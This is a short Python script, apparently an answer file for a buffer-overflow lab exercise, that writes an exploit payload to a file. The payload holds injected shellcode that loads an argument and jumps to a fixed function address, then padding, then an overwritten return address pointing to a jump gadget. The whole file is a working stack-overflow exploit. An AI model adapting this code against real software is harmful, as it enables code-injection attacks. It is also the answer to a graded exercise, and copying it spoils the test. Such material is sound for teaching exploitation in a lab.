# answer3.py
import struct

OFFSET_RET = 0x28
JMP_XS = 0x401334
FUNC1 = 0x401216
ARG = 0x72

# 注入代码：
# mov edi, 0x72
# push 0x401216
# ret
shellcode = b"\xbf" + struct.pack("<I", ARG) \
          + b"\x68" + struct.pack("<I", FUNC1) \
          + b"\xc3"

payload  = shellcode
payload += b"A" * (OFFSET_RET - len(shellcode))
payload += struct.pack("<Q", JMP_XS)

with open("payload3", "wb") as f:
    f.write(payload)

print("[+] wrote payload3, len =", len(payload))
